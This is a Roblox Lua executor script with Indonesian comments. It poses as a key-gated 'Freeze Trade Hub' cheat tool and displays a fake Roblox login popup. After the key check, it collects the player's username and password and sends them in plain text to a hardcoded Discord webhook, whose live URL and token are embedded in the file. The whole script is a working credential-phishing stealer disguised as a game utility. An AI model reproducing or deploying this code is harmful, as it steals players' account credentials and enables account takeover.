-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    if syn and syn.request then
        local response = syn.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif http and http.request then
        local response = http.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif request then
        local response = request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Membuat GUI Login
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local subtitleLabel = Instance.new("TextLabel")
local keyBox = Instance.new("TextBox") -- Input untuk key
local verifyKeyButton = Instance.new("TextButton") -- Tombol untuk validasi key
local copyLinkButton = Instance.new("TextButton") -- Tombol untuk salin link
local usernameBox = Instance.new("TextBox")
local passwordBox = Instance.new("TextBox")
local loginButton = Instance.new("TextButton")

-- Properti ScreenGui
screenGui.Name = "LoginPopup"
screenGui.Parent = game:GetService("CoreGui")

-- Properti Frame
frame.Name = "LoginFrame"
frame.Parent = screenGui
frame.Size = UDim2.new(0, 300, 0, 320)
frame.Position = UDim2.new(0.5, -150, 0.5, -160)
frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
frame.BorderSizePixel = 3
frame.BorderColor3 = Color3.new(1, 0, 0)

-- Properti TitleLabel
titleLabel.Name = "TitleLabel"
titleLabel.Parent = frame
titleLabel.Size = UDim2.new(1, -10, 0, 40)
titleLabel.Position = UDim2.new(0, 5, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Text = "Freeze Trade Hub"
titleLabel.TextSize = 24
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextStrokeTransparency = 0
titleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)

-- Properti SubtitleLabel
subtitleLabel.Name = "SubtitleLabel"
subtitleLabel.Parent = frame
subtitleLabel.Size = UDim2.new(1, -10, 0, 20)
subtitleLabel.Position = UDim2.new(0, 5, 0, 45)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Font = Enum.Font.SourceSans
subtitleLabel.Text = "Login Roblox Untuk Melanjutkan"
subtitleLabel.TextSize = 16
subtitleLabel.TextColor3 = Color3.new(1, 1, 1)
subtitleLabel.TextStrokeTransparency = 0.8
subtitleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)

-- Properti KeyBox
keyBox.Name = "KeyBox"
keyBox.Parent = frame
keyBox.Size = UDim2.new(1, -20, 0, 40)
keyBox.Position = UDim2.new(0, 10, 0, 70)
keyBox.PlaceholderText = "Enter Key"
keyBox.Font = Enum.Font.SourceSans
keyBox.Text = ""
keyBox.TextSize = 16
keyBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
keyBox.TextColor3 = Color3.new(1, 1, 1)

-- Properti VerifyKeyButton
verifyKeyButton.Name = "VerifyKeyButton"
verifyKeyButton.Parent = frame
verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
verifyKeyButton.Position = UDim2.new(0, 10, 0, 120)
verifyKeyButton.Text = "Verify Key"
verifyKeyButton.Font = Enum.Font.SourceSansBold
verifyKeyButton.TextSize = 18
verifyKeyButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
verifyKeyButton.TextColor3 = Color3.new(1, 1, 1)

-- Properti CopyLinkButton
copyLinkButton.Name = "CopyLinkButton"
copyLinkButton.Parent = frame
copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
copyLinkButton.Position = UDim2.new(0, 10, 0, 170)
copyLinkButton.Text = "Copy Link"
copyLinkButton.Font = Enum.Font.SourceSansBold
copyLinkButton.TextSize = 18
copyLinkButton.BackgroundColor3 = Color3.new(0.2, 0.5, 1)
copyLinkButton.TextColor3 = Color3.new(1, 1, 1)

-- Properti UsernameBox
usernameBox.Name = "UsernameBox"
usernameBox.Parent = frame
usernameBox.Size = UDim2.new(1, -20, 0, 40)
usernameBox.Position = UDim2.new(0, 10, 0, 220)
usernameBox.PlaceholderText = "Enter Username"
usernameBox.Font = Enum.Font.SourceSans
usernameBox.Text = ""
usernameBox.TextSize = 16
usernameBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
usernameBox.TextColor3 = Color3.new(1, 1, 1)
usernameBox.Visible = false

-- Properti PasswordBox
passwordBox.Name = "PasswordBox"
passwordBox.Parent = frame
passwordBox.Size = UDim2.new(1, -20, 0, 40)
passwordBox.Position = UDim2.new(0, 10, 0, 270)
passwordBox.PlaceholderText = "Enter Password"
passwordBox.Font = Enum.Font.SourceSans
passwordBox.Text = ""
passwordBox.TextSize = 16
passwordBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
passwordBox.TextColor3 = Color3.new(1, 1, 1)
passwordBox.Visible = false

-- Properti LoginButton
loginButton.Name = "LoginButton"
loginButton.Parent = frame
loginButton.Size = UDim2.new(1, -20, 0, 40)
loginButton.Position = UDim2.new(0, 10, 0, 320)
loginButton.Text = "Login"
loginButton.Font = Enum.Font.SourceSansBold
loginButton.TextSize = 18
loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
loginButton.TextColor3 = Color3.new(1, 1, 1)
loginButton.Visible = false

-- Fungsi untuk menyalin link ke clipboard
copyLinkButton.MouseButton1Click:Connect(function()
    setclipboard(linkUrl)
    print("Link disalin ke clipboard!")
end)

-- Fungsi untuk validasi key
verifyKeyButton.MouseButton1Click:Connect(function()
    if keyBox.Text == correctKey then
        print("Key valid!")
        keyBox.Visible = false
        verifyKeyButton.Visible = false
        copyLinkButton.Visible = false
        usernameBox.Visible = true
        passwordBox.Visible = true
        loginButton.Visible = true
    else
        print("Key tidak valid!")
    end
end)

-- Fungsi untuk login
loginButton.MouseButton1Click:Connect(function()
    local username = usernameBox.Text
    local password = passwordBox.Text

    if username ~= "" and password ~= "" then
        print("Tombol Login Ditekan! Username:", username, "Password:", password)
        sendToDiscord(username, password)
        screenGui:Destroy()
    else
        print("Username atau password kosong!")
    end
end)
